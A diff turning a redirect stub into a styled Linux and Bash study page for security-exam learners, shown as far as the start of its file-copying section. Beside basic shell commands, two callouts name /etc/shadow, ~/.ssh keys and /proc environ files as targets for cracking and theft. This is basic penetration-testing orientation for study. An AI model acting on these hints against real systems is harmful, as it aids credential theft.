@@ -1,14 +1,1827 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Linux Bash Notes</title>
-    <meta http-equiv="refresh" content="0; url=../linux_bash_notes.html" />
-  </head>
-  <body>
-    <p>
-      Redirecting to <a href="../linux_bash_notes.html">Linux Bash notes</a>...
-    </p>
-  </body>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux & Bash — Deep Dive Notes</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Michroma&family=Barlow:wght@300;400;500;600&family=Barlow+Condensed:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+/* ── DESIGN SYSTEM ──────────────────────────── */
+:root {
+  --bg:       #0b0b0b;
+  --bg2:      #111111;
+  --bg3:      #161616;
+  --bg4:      #1c1c1c;
+  --amber:    #e8a020;
+  --amber2:   #f0c060;
+  --amber3:   #c07010;
+  --green:    #3dba6e;
+  --green2:   #2a9e57;
+  --red:      #e05050;
+  --blue:     #5aabdd;
+  --cyan:     #30c8c8;
+  --purple:   #a080e0;
+  --text:     #d8d0c0;
+  --text2:    #a09080;
+  --text3:    #706050;
+  --border:   rgba(232,160,32,0.15);
+  --border2:  rgba(232,160,32,0.30);
+  --border3:  rgba(232,160,32,0.50);
+  --mono:     'Share Tech Mono', 'Courier New', monospace;
+  --display:  'Michroma', monospace;
+  --body:     'Barlow', sans-serif;
+  --cond:     'Barlow Condensed', sans-serif;
+  --sidebar-w: 270px;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--body);
+  font-size: 14px;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* scanline texture */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(
+    0deg, transparent, transparent 3px,
+    rgba(0,0,0,0.08) 3px, rgba(0,0,0,0.08) 4px
+  );
+  pointer-events: none; z-index: 9999;
+}
+
+/* ── SIDEBAR ────────────────────────────────── */
+.sidebar {
+  position: fixed; left: 0; top: 0; bottom: 0;
+  width: var(--sidebar-w);
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  overflow-y: auto; z-index: 200;
+  display: flex; flex-direction: column;
+}
+.sidebar::-webkit-scrollbar { width: 3px; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border2); }
+
+.sb-header {
+  padding: 24px 20px 18px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+.sb-header::after {
+  content: '';
+  position: absolute; bottom: -1px; left: 0; right: 0;
+  height: 1px;
+  background: linear-gradient(90deg, var(--amber), transparent);
+}
+.sb-logo {
+  font-family: var(--display);
+  font-size: 10px;
+  letter-spacing: .25em;
+  color: var(--amber3);
+  text-transform: uppercase;
+  margin-bottom: 10px;
+}
+.sb-title {
+  font-family: var(--display);
+  font-size: 16px;
+  color: var(--amber);
+  line-height: 1.3;
+  letter-spacing: .05em;
+}
+.sb-sub {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--text3);
+  margin-top: 6px;
+}
+.sb-progress {
+  margin-top: 14px;
+  display: flex; gap: 3px; flex-wrap: wrap;
+}
+.sb-dot {
+  width: 8px; height: 8px; border-radius: 1px;
+  background: var(--border);
+  border: 1px solid var(--border2);
+  cursor: pointer; transition: background .2s;
+}
+.sb-dot.done { background: var(--amber); border-color: var(--amber); }
+.sb-dot:hover { background: var(--amber3); }
+
+.sb-section-label {
+  font-family: var(--mono);
+  font-size: 9px; letter-spacing: .2em;
+  color: var(--text3); text-transform: uppercase;
+  padding: 16px 20px 6px;
+}
+.sb-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 7px 20px;
+  font-size: 12px; color: var(--text2);
+  cursor: pointer; transition: all .15s;
+  border-left: 2px solid transparent;
+  font-family: var(--body);
+}
+.sb-item:hover { color: var(--amber); background: rgba(232,160,32,0.05); }
+.sb-item.active { color: var(--amber); border-left-color: var(--amber); background: rgba(232,160,32,0.08); }
+.sb-num { font-family: var(--mono); font-size: 10px; color: var(--text3); min-width: 18px; }
+
+.sb-footer {
+  margin-top: auto;
+  padding: 14px 20px;
+  border-top: 1px solid var(--border);
+  font-family: var(--mono);
+  font-size: 10px; color: var(--text3);
+  line-height: 1.8;
+}
+
+/* ── MAIN CONTENT ───────────────────────────── */
+.main { margin-left: var(--sidebar-w); min-height: 100vh; }
+
+/* ── HERO ───────────────────────────────────── */
+.hero {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border2);
+  padding: 56px 64px 48px;
+  position: relative; overflow: hidden;
+}
+.hero::before {
+  content: 'LINUX';
+  position: absolute; right: -20px; top: -20px;
+  font-family: var(--display);
+  font-size: 180px; font-weight: 700;
+  color: rgba(232,160,32,0.025);
+  pointer-events: none; line-height: 1;
+  letter-spacing: -.02em;
+}
+.hero-tag {
+  display: inline-block;
+  font-family: var(--mono); font-size: 10px;
+  letter-spacing: .2em; text-transform: uppercase;
+  color: var(--amber3);
+  border: 1px solid var(--border2);
+  padding: 4px 12px; margin-bottom: 20px;
+}
+.hero h1 {
+  font-family: var(--display);
+  font-size: clamp(28px,5vw,52px);
+  color: var(--amber);
+  letter-spacing: .05em;
+  line-height: 1.1; margin-bottom: 6px;
+}
+.hero h1 span { color: var(--text2); }
+.hero-desc {
+  font-family: var(--body);
+  font-size: 14px; color: var(--text2);
+  max-width: 560px; line-height: 1.7;
+  font-weight: 300; margin-top: 14px;
+}
+.hero-stats {
+  display: flex; gap: 32px; margin-top: 32px; flex-wrap: wrap;
+}
+.stat { }
+.stat-val {
+  font-family: var(--display);
+  font-size: 28px; color: var(--amber2);
+  letter-spacing: .05em;
+}
+.stat-lbl {
+  font-family: var(--mono); font-size: 9px;
+  color: var(--text3); text-transform: uppercase;
+  letter-spacing: .15em; margin-top: 2px;
+}
+.hero-divider {
+  display: flex; align-items: center; gap: 12px;
+  margin-top: 32px;
+  font-family: var(--mono); font-size: 10px; color: var(--text3);
+}
+.hero-divider::before, .hero-divider::after {
+  content: ''; flex: 1; height: 1px;
+  background: linear-gradient(90deg, var(--border2), transparent);
+}
+
+/* ── SECTIONS ───────────────────────────────── */
+.section {
+  padding: 52px 64px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+.section::before {
+  content: '';
+  position: absolute; left: 0; top: 0; bottom: 0;
+  width: 2px;
+  background: linear-gradient(180deg, var(--amber3), transparent);
+}
+
+.sec-header { display: flex; align-items: flex-start; gap: 20px; margin-bottom: 36px; }
+.sec-num {
+  font-family: var(--display);
+  font-size: 44px; color: rgba(232,160,32,0.12);
+  line-height: 1; flex-shrink: 0; margin-top: -4px;
+  letter-spacing: .05em;
+}
+.sec-meta { flex: 1; }
+.sec-meta h2 {
+  font-family: var(--display);
+  font-size: 22px; color: var(--amber);
+  letter-spacing: .08em; line-height: 1.2;
+}
+.sec-meta p {
+  font-size: 13px; color: var(--text2);
+  margin-top: 6px; font-weight: 300; line-height: 1.6;
+}
+
+/* ── CARDS ──────────────────────────────────── */
+.card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  margin-bottom: 20px;
+  position: relative; overflow: hidden;
+}
+.card::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0;
+  height: 1px;
+  background: linear-gradient(90deg, var(--amber3), transparent 60%);
+}
+.card-head {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 18px;
+  background: var(--bg3);
+  border-bottom: 1px solid var(--border);
+  cursor: pointer; user-select: none;
+}
+.card-head h3 {
+  font-family: var(--cond);
+  font-size: 15px; font-weight: 600;
+  color: var(--amber2); letter-spacing: .05em;
+}
+.card-tags { display: flex; gap: 6px; }
+.ctag {
+  font-family: var(--mono); font-size: 9px;
+  letter-spacing: .1em; text-transform: uppercase;
+  padding: 2px 8px; border: 1px solid;
+}
+.ctag-a { color: var(--amber3); border-color: var(--border2); }
+.ctag-g { color: var(--green); border-color: rgba(61,186,110,.25); }
+.ctag-r { color: var(--red); border-color: rgba(224,80,80,.25); }
+.ctag-b { color: var(--blue); border-color: rgba(90,171,221,.25); }
+.card-chevron { color: var(--text3); font-size: 12px; transition: transform .2s; margin-left: 8px; }
+.card.open .card-chevron { transform: rotate(180deg); }
+.card-body { padding: 20px 18px; display: none; }
+.card.open .card-body { display: block; }
+.card.open-default .card-body { display: block; }
+
+/* ── CODE BLOCKS ────────────────────────────── */
+.code {
+  background: #080808;
+  border: 1px solid var(--border);
+  margin: 14px 0; overflow: hidden;
+}
+.code-bar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 7px 14px;
+  background: var(--bg3);
+  border-bottom: 1px solid var(--border);
+}
+.code-bar .dots { display: flex; gap: 5px; }
+.code-bar .dots span { width: 8px; height: 8px; border-radius: 50%; }
+.dot-r { background: #e05050; }
+.dot-y { background: var(--amber); }
+.dot-g { background: var(--green); }
+.code-bar .lang {
+  font-family: var(--mono); font-size: 10px;
+  color: var(--text3); letter-spacing: .1em; text-transform: uppercase;
+}
+.code-bar .copy-btn {
+  font-family: var(--mono); font-size: 10px;
+  color: var(--text3); background: none;
+  border: 1px solid var(--border); padding: 2px 10px;
+  cursor: pointer; letter-spacing: .05em; transition: all .15s;
+}
+.copy-btn:hover { color: var(--amber); border-color: var(--border2); }
+pre {
+  padding: 16px 18px;
+  font-family: var(--mono); font-size: 12.5px;
+  line-height: 1.9; overflow-x: auto; color: var(--text);
+}
+pre::-webkit-scrollbar { height: 3px; }
+pre::-webkit-scrollbar-thumb { background: var(--border2); }
+
+/* syntax */
+.k  { color: var(--amber2); }
+.s  { color: var(--green); }
+.c  { color: var(--text3); font-style: italic; }
+.v  { color: var(--cyan); }
+.o  { color: var(--amber3); }
+.p  { color: var(--red); }
+.f  { color: var(--blue); }
+.n  { color: var(--purple); }
+
+/* ── DIAGRAMS ───────────────────────────────── */
+.diagram {
+  background: #080808;
+  border: 1px solid var(--border);
+  border-left: 2px solid var(--amber3);
+  padding: 18px 20px; margin: 14px 0;
+  font-family: var(--mono); font-size: 12px;
+  line-height: 1.9; overflow-x: auto; white-space: pre;
+  color: var(--text2);
+}
+.dh { color: var(--amber); font-weight: bold; }
+.dg { color: var(--green); }
+.dr { color: var(--red); }
+.db { color: var(--blue); }
+.dc { color: var(--cyan); }
+.dd { color: var(--text3); }
+
+/* ── TABLES ─────────────────────────────────── */
+table.dt {
+  width: 100%; border-collapse: collapse;
+  margin: 14px 0; font-size: 13px;
+}
+table.dt th {
+  background: var(--bg3);
+  color: var(--amber2);
+  font-family: var(--cond); font-weight: 600;
+  font-size: 12px; letter-spacing: .08em;
+  padding: 9px 14px; text-align: left;
+  border-bottom: 1px solid var(--border2);
+}
+table.dt td {
+  padding: 8px 14px;
+  border-bottom: 1px solid var(--border);
+  vertical-align: top; color: var(--text);
+}
+table.dt tr:hover td { background: rgba(232,160,32,0.03); }
+.mono-cell { font-family: var(--mono); font-size: 11.5px; color: var(--cyan); }
+
+/* ── CALLOUTS ───────────────────────────────── */
+.note {
+  border-left: 2px solid; padding: 12px 16px;
+  margin: 14px 0; font-size: 13px; line-height: 1.65;
+}
+.note-label {
+  font-family: var(--mono); font-size: 9px;
+  text-transform: uppercase; letter-spacing: .18em;
+  margin-bottom: 5px; font-weight: 700;
+}
+.note-a { border-color: var(--amber); background: rgba(232,160,32,0.06); }
+.note-a .note-label { color: var(--amber); }
+.note-g { border-color: var(--green); background: rgba(61,186,110,0.06); }
+.note-g .note-label { color: var(--green); }
+.note-r { border-color: var(--red); background: rgba(224,80,80,0.06); }
+.note-r .note-label { color: var(--red); }
+.note-b { border-color: var(--blue); background: rgba(90,171,221,0.06); }
+.note-b .note-label { color: var(--blue); }
+
+/* ── GRIDS ──────────────────────────────────── */
+.g2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+.g3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+@media(max-width: 900px) {
+  .g2, .g3 { grid-template-columns: 1fr; }
+  .main { margin-left: 0; }
+  .sidebar { display: none; }
+  .hero, .section { padding: 36px 24px; }
+}
+
+.mini {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  padding: 14px 16px;
+}
+.mini h4 {
+  font-family: var(--cond); font-size: 13px;
+  font-weight: 600; color: var(--amber2);
+  letter-spacing: .05em; margin-bottom: 8px;
+}
+.mini p, .mini li { font-size: 12.5px; color: var(--text2); line-height: 1.65; }
+
+/* ── PERMISSIONS VISUAL ─────────────────────── */
+.perm-visual {
+  display: flex; gap: 2px; margin: 16px 0;
+  font-family: var(--mono); overflow-x: auto;
+}
+.pv-group {
+  display: flex; flex-direction: column;
+  align-items: center; gap: 4px;
+}
+.pv-bits { display: flex; gap: 1px; }
+.pv-bit {
+  width: 30px; height: 30px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px; font-weight: 700; border: 1px solid;
+}
+.pv-bit.on-r { background: rgba(224,80,80,0.15); border-color: var(--red); color: var(--red); }
+.pv-bit.on-w { background: rgba(232,160,32,0.15); border-color: var(--amber); color: var(--amber); }
+.pv-bit.on-x { background: rgba(61,186,110,0.15); border-color: var(--green); color: var(--green); }
+.pv-bit.off  { background: var(--bg3); border-color: var(--border); color: var(--text3); }
+.pv-label { font-size: 10px; color: var(--text3); letter-spacing: .08em; }
+
+/* ── FILESYSTEM TREE ────────────────────────── */
+.fs-tree {
+  font-family: var(--mono); font-size: 12px;
+  line-height: 1.9; color: var(--text2);
+  background: #080808;
+  border: 1px solid var(--border);
+  padding: 18px 20px; margin: 14px 0;
+}
+.fs-dir { color: var(--blue); }
+.fs-imp { color: var(--amber2); font-weight: 700; }
+.fs-sys { color: var(--purple); }
+.fs-sec { color: var(--red); }
+.fs-note { color: var(--text3); font-style: italic; }
+
+/* ── PROCESS FLOW ───────────────────────────── */
+.flow { display: flex; align-items: center; gap: 0; flex-wrap: wrap; margin: 14px 0; }
+.fl-step {
+  background: var(--bg3); border: 1px solid var(--border);
+  padding: 10px 16px; font-family: var(--mono);
+  font-size: 11px; color: var(--amber2);
+  min-width: 100px; text-align: center; line-height: 1.4;
+}
+.fl-step.hl { border-color: var(--amber); background: rgba(232,160,32,0.08); }
+.fl-arr { padding: 0 6px; color: var(--text3); font-size: 16px; }
+
+/* ── MISC ───────────────────────────────────── */
+p { margin-bottom: 10px; color: var(--text2); font-size: 14px; }
+p:last-child { margin-bottom: 0; }
+ul, ol { padding-left: 20px; margin: 8px 0; }
+li { margin-bottom: 4px; color: var(--text2); font-size: 13.5px; line-height: 1.65; }
+strong { color: var(--text); font-weight: 500; }
+.mi { font-family: var(--mono); font-size: 11.5px; background: var(--bg3); padding: 1px 6px; border: 1px solid var(--border); color: var(--cyan); }
+hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+.tag-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
+.tag-pill { font-family: var(--mono); font-size: 10px; letter-spacing: .1em; padding: 3px 10px; border: 1px solid var(--border2); color: var(--text3); }
+</style>
+</head>
+<body>
+
+<!-- ═══════════ SIDEBAR ═══════════ -->
+<nav class="sidebar">
+  <div class="sb-header">
+    <div class="sb-logo">Cybersec Notes · Phase 1</div>
+    <div class="sb-title">LINUX<br>& BASH</div>
+    <div class="sb-sub">// deep dive with commands & code</div>
+    <div class="sb-progress" id="sb-progress"></div>
+  </div>
+
+  <div class="sb-section-label">Foundations</div>
+  <div class="sb-item active" onclick="goTo('s1',this)"><span class="sb-num">01</span>Linux Architecture</div>
+  <div class="sb-item" onclick="goTo('s2',this)"><span class="sb-num">02</span>Filesystem Hierarchy</div>
+  <div class="sb-item" onclick="goTo('s3',this)"><span class="sb-num">03</span>File & Directory Ops</div>
+  <div class="sb-item" onclick="goTo('s4',this)"><span class="sb-num">04</span>Permissions & Ownership</div>
+
+  <div class="sb-section-label">Core Skills</div>
+  <div class="sb-item" onclick="goTo('s5',this)"><span class="sb-num">05</span>Users & Groups</div>
+  <div class="sb-item" onclick="goTo('s6',this)"><span class="sb-num">06</span>Processes & Jobs</div>
+  <div class="sb-item" onclick="goTo('s7',this)"><span class="sb-num">07</span>Text Processing</div>
+  <div class="sb-item" onclick="goTo('s8',this)"><span class="sb-num">08</span>Networking Commands</div>
+
+  <div class="sb-section-label">Power Tools</div>
+  <div class="sb-item" onclick="goTo('s9',this)"><span class="sb-num">09</span>Bash Scripting</div>
+  <div class="sb-item" onclick="goTo('s10',this)"><span class="sb-num">10</span>Cron & Automation</div>
+  <div class="sb-item" onclick="goTo('s11',this)"><span class="sb-num">11</span>Package Management</div>
+
+  <div class="sb-section-label">Security</div>
+  <div class="sb-item" onclick="goTo('s12',this)"><span class="sb-num">12</span>Security & PrivEsc</div>
+  <div class="sb-item" onclick="goTo('s13',this)"><span class="sb-num">13</span>Log Analysis</div>
+  <div class="sb-item" onclick="goTo('s14',this)"><span class="sb-num">14</span>Quick Reference</div>
+
+  <div class="sb-footer">
+    topics: 14 &nbsp;|&nbsp; commands: 100+<br>
+    level: deep dive<br>
+    exam: Security+ / OSCP
+  </div>
+</nav>
+
+<!-- ═══════════ MAIN ═══════════ -->
+<main class="main">
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">cybersecurity · phase 1 foundations</div>
+  <h1>LINUX <span>&amp;</span><br>BASH</h1>
+  <p class="hero-desc">A complete deep-dive reference covering Linux architecture, filesystem hierarchy, permissions, processes, text processing, networking, bash scripting, automation, and security — with 100+ commands, diagrams, and real examples.</p>
+  <div class="hero-stats">
+    <div class="stat"><div class="stat-val">14</div><div class="stat-lbl">Topics</div></div>
+    <div class="stat"><div class="stat-val">100+</div><div class="stat-lbl">Commands</div></div>
+    <div class="stat"><div class="stat-val">30+</div><div class="stat-lbl">Code Examples</div></div>
+    <div class="stat"><div class="stat-val">OSCP</div><div class="stat-lbl">Exam Level</div></div>
+  </div>
+  <div class="hero-divider">root@kali:~# cat notes.md | grep everything</div>
+</div>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S1: LINUX ARCHITECTURE -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s1">
+  <div class="sec-header">
+    <div class="sec-num">01</div>
+    <div class="sec-meta">
+      <h2>LINUX ARCHITECTURE</h2>
+      <p>How the Linux OS is structured — from hardware up to user applications. Understanding this makes everything else click.</p>
+    </div>
+  </div>
+
+  <div class="tag-row">
+    <span class="tag-pill">kernel</span><span class="tag-pill">shell</span><span class="tag-pill">system calls</span><span class="tag-pill">daemons</span>
+  </div>
+
+  <div class="diagram"><span class="dh">┌─────────────────────────────────────────────────────────┐</span>
+<span class="dh">│                    USER SPACE                           │</span>
+<span class="dh">├───────────────┬───────────────┬────────────────────────┤</span>
+<span class="dg">│  Applications │  Shell (bash) │  System Daemons        │</span>
+<span class="dg">│  (firefox,vim)│  (user input) │  (sshd, cron, nginx)   │</span>
+<span class="dh">├───────────────┴───────────────┴────────────────────────┤</span>
+<span class="dh">│                C STANDARD LIBRARY (glibc)               │</span>
+<span class="dh">├─────────────────────────────────────────────────────────┤</span>
+<span class="dh">│                    KERNEL SPACE                         │</span>
+<span class="db">├──────────┬──────────┬──────────┬────────────────────────┤</span>
+<span class="db">│  Process │  Memory  │   VFS    │  Network Stack         │</span>
+<span class="db">│ Scheduler│ Manager  │(File I/O)│  (TCP/IP, sockets)     │</span>
+<span class="db">├──────────┴──────────┴──────────┴────────────────────────┤</span>
+<span class="dc">│              DEVICE DRIVERS / MODULES                    │</span>
+<span class="dh">├─────────────────────────────────────────────────────────┤</span>
+<span class="dd">│                    HARDWARE                              │</span>
+<span class="dd">│        CPU · RAM · Disk · Network · USB                  │</span>
+<span class="dh">└─────────────────────────────────────────────────────────┘</span></div>
+
+  <div class="g2" style="margin-top:20px">
+    <div class="mini">
+      <h4>Kernel — The Core</h4>
+      <p>Manages hardware, memory, processes, and syscalls. Runs in privileged "ring 0". Users never interact with it directly — they go through the shell or system calls.</p>
+      <ul style="margin-top:8px">
+        <li>Process scheduling (who runs when)</li>
+        <li>Memory management (virtual address spaces)</li>
+        <li>VFS (unified file access layer)</li>
+        <li>Network stack (TCP/IP implemented here)</li>
+      </ul>
+    </div>
+    <div class="mini">
+      <h4>Shell — Your Interface</h4>
+      <p>The shell (bash, zsh, sh) is a program that takes your text commands, interprets them, and calls the kernel on your behalf via system calls.</p>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span></div>
+        <pre><span class="c"># See which shell you're running</span>
+echo <span class="v">$SHELL</span>       <span class="c"># /bin/bash</span>
+echo <span class="v">$0</span>           <span class="c"># bash</span>
+
+<span class="c"># Available shells</span>
+cat <span class="s">/etc/shells</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card open-default">
+    <div class="card-head"><h3>Everything is a File</h3><div class="card-tags"><span class="ctag ctag-a">philosophy</span></div></div>
+    <div class="card-body">
+      <p>Linux treats almost everything as a file — regular files, directories, devices, processes, sockets, pipes. This is the Unix philosophy that makes tools composable.</p>
+      <table class="dt">
+        <tr><th>Path</th><th>What it represents</th><th>Example</th></tr>
+        <tr><td class="mono-cell">/dev/sda</td><td>Hard disk device</td><td>dd if=/dev/sda of=backup.img</td></tr>
+        <tr><td class="mono-cell">/dev/null</td><td>Bit bucket — discards all input</td><td>command 2>/dev/null</td></tr>
+        <tr><td class="mono-cell">/dev/zero</td><td>Infinite stream of zero bytes</td><td>dd if=/dev/zero of=zeros bs=1M count=100</td></tr>
+        <tr><td class="mono-cell">/proc/1234</td><td>Process info for PID 1234</td><td>cat /proc/1234/cmdline</td></tr>
+        <tr><td class="mono-cell">/proc/net/tcp</td><td>Active TCP connections</td><td>cat /proc/net/tcp</td></tr>
+        <tr><td class="mono-cell">/sys/class/net</td><td>Network interfaces</td><td>ls /sys/class/net/</td></tr>
+      </table>
+      <div class="note note-r"><div class="note-label">Security</div>/proc/[pid]/maps reveals memory layout — used in exploit development and forensics. /proc/[pid]/environ leaks environment variables including potential passwords.</div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S2: FILESYSTEM HIERARCHY -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s2">
+  <div class="sec-header">
+    <div class="sec-num">02</div>
+    <div class="sec-meta">
+      <h2>FILESYSTEM HIERARCHY</h2>
+      <p>The FHS (Filesystem Hierarchy Standard) — what lives where and why. Navigate with confidence, find config files, and know where secrets hide.</p>
+    </div>
+  </div>
+
+  <div class="fs-tree"><span class="fs-dir">/</span>  <span class="fs-note">← root of everything</span>
+<span class="dd">├── </span><span class="fs-imp">bin/</span>         <span class="fs-note">← essential user binaries: ls, cp, cat, bash</span>
+<span class="dd">├── </span><span class="fs-imp">sbin/</span>        <span class="fs-note">← system binaries (root): ifconfig, fdisk, iptables</span>
+<span class="dd">├── </span><span class="fs-imp">etc/</span>         <span class="fs-note">← ALL system configuration files</span>
+<span class="dd">│   ├── </span><span class="fs-sec">passwd</span>    <span class="fs-note">← user accounts (world-readable!)</span>
+<span class="dd">│   ├── </span><span class="fs-sec">shadow</span>    <span class="fs-note">← password hashes (root only)</span>
+<span class="dd">│   ├── </span><span class="fs-sec">sudoers</span>   <span class="fs-note">← sudo permissions</span>
+<span class="dd">│   ├── </span><span class="dg">hosts</span>     <span class="fs-note">← static DNS (IP→hostname mappings)</span>
+<span class="dd">│   ├── </span><span class="dg">ssh/</span>      <span class="fs-note">← SSH server config</span>
+<span class="dd">│   └── </span><span class="dg">crontab</span>  <span class="fs-note">← system-wide scheduled tasks</span>
+<span class="dd">├── </span><span class="fs-dir">home/</span>        <span class="fs-note">← user home directories</span>
+<span class="dd">│   └── </span><span class="fs-dir">rudra/</span>   <span class="fs-note">← your home: ~/</span>
+<span class="dd">│       ├── </span><span class="fs-sec">.ssh/</span> <span class="fs-note">← SSH keys (600 permissions!)</span>
+<span class="dd">│       ├── </span><span class="dg">.bashrc</span><span class="fs-note">← bash config, aliases, PATH</span>
+<span class="dd">│       └── </span><span class="dg">.bash_history</span> <span class="fs-note">← command history</span>
+<span class="dd">├── </span><span class="fs-sys">proc/</span>        <span class="fs-note">← virtual FS: running processes, kernel info</span>
+<span class="dd">├── </span><span class="fs-sys">sys/</span>         <span class="fs-note">← virtual FS: hardware/kernel parameters</span>
+<span class="dd">├── </span><span class="fs-imp">var/</span>         <span class="fs-note">← variable data</span>
+<span class="dd">│   ├── </span><span class="fs-sec">log/</span>     <span class="fs-note">← system logs: auth.log, syslog, kern.log</span>
+<span class="dd">│   └── </span><span class="dg">www/</span>     <span class="fs-note">← web server files (Apache/Nginx)</span>
+<span class="dd">├── </span><span class="fs-dir">tmp/</span>         <span class="fs-note">← temp files, world-writable → pentest hotspot</span>
+<span class="dd">├── </span><span class="fs-imp">usr/</span>         <span class="fs-note">← user programs</span>
+<span class="dd">│   ├── </span><span class="dg">bin/</span>     <span class="fs-note">← most user commands (python, gcc, nmap)</span>
+<span class="dd">│   └── </span><span class="dg">local/</span>  <span class="fs-note">← manually installed software</span>
+<span class="dd">├── </span><span class="fs-dir">dev/</span>         <span class="fs-note">← device files (disks, null, random)</span>
+<span class="dd">├── </span><span class="fs-dir">mnt/</span>         <span class="fs-note">← mount points for external drives</span>
+<span class="dd">└── </span><span class="fs-imp">root/</span>        <span class="fs-note">← root user's home directory</span></div>
+
+  <div class="note note-r">
+    <div class="note-label">Pentesting Hotspots</div>
+    <strong>/etc/passwd</strong> — username enumeration &nbsp;|&nbsp; <strong>/etc/shadow</strong> — hash cracking target &nbsp;|&nbsp; <strong>/tmp</strong> — world-writable, often used to drop exploit payloads &nbsp;|&nbsp; <strong>~/.ssh/</strong> — private key theft &nbsp;|&nbsp; <strong>/var/log/</strong> — evidence of compromise &nbsp;|&nbsp; <strong>/root/</strong> — flags in CTFs
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S3: FILE & DIRECTORY OPERATIONS -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s3">
+  <div class="sec-header">
+    <div class="sec-num">03</div>
+    <div class="sec-meta">
+      <h2>FILE & DIRECTORY OPERATIONS</h2>
+      <p>Navigating, creating, copying, moving, searching — the bread and butter of terminal work.</p>
+    </div>
+  </div>
+
+  <div class="card open-default">
+    <div class="card-head"><h3>Navigation & Listing</h3><div class="card-tags"><span class="ctag ctag-g">essential</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── NAVIGATION ──────────────────────────────</span>
+<span class="k">pwd</span>                   <span class="c"># print working directory</span>
+<span class="k">cd</span> <span class="s">/var/log</span>           <span class="c"># absolute path</span>
+<span class="k">cd</span> <span class="s">Documents</span>          <span class="c"># relative path</span>
+<span class="k">cd</span> <span class="s">..</span>                 <span class="c"># parent directory</span>
+<span class="k">cd</span> <span class="s">~</span>                  <span class="c"># home directory</span>
+<span class="k">cd</span> <span class="s">-</span>                  <span class="c"># previous directory (toggle!)</span>
+
+<span class="c"># ── LISTING ─────────────────────────────────</span>
+<span class="k">ls</span>                    <span class="c"># list files</span>
+<span class="k">ls</span> <span class="o">-l</span>                 <span class="c"># long format: perms, owner, size, date</span>
+<span class="k">ls</span> <span class="o">-la</span>                <span class="c"># include hidden files (dot files)</span>
+<span class="k">ls</span> <span class="o">-lh</span>                <span class="c"># human-readable sizes (KB, MB)</span>
+<span class="k">ls</span> <span class="o">-lt</span>                <span class="c"># sort by modification time (newest first)</span>
+<span class="k">ls</span> <span class="o">-lS</span>                <span class="c"># sort by size (largest first)</span>
+<span class="k">ls</span> <span class="o">-R</span>                 <span class="c"># recursive listing (all subdirs)</span>
+<span class="k">ls</span> <span class="o">-la</span> <span class="s">/etc</span>           <span class="c"># list specific directory</span>
+
+<span class="c"># Reading ls -l output:</span>
+<span class="c"># -rwxr-xr-x  1  root  root  4096  May 12  bash</span>
+<span class="c"># │└──────┘      │     │     │     │       └─ filename</span>
+<span class="c"># │perms         │     │     │     └─ date modified</span>
+<span class="c"># │              │     │     └─ size in bytes</span>
+<span class="c"># └─ type        │     └─ group</span>
+<span class="c">#  (d=dir,-=file)└─ owner</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="c-fileops">
+    <div class="card-head" onclick="toggle('c-fileops')"><h3>Create, Copy, Move, Delete</h3><div class="card-tags"><span class="ctag ctag-g">essential</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── CREATING ────────────────────────────────</span>
+<span class="k">touch</span> <span class="s">file.txt</span>        <span class="c"># create empty file / update timestamp</span>
+<span class="k">mkdir</span> <span class="s">newdir</span>          <span class="c"># create directory</span>
+<span class="k">mkdir</span> <span class="o">-p</span> <span class="s">a/b/c/d</span>     <span class="c"># create nested dirs in one go</span>
+echo <span class="s">"hello"</span> &gt; <span class="s">file.txt</span>  <span class="c"># write to file (overwrites)</span>
+echo <span class="s">"more"</span> &gt;&gt; <span class="s">file.txt</span>  <span class="c"># append to file</span>
+
+<span class="c"># ── COPYING ─────────────────────────────────</span>
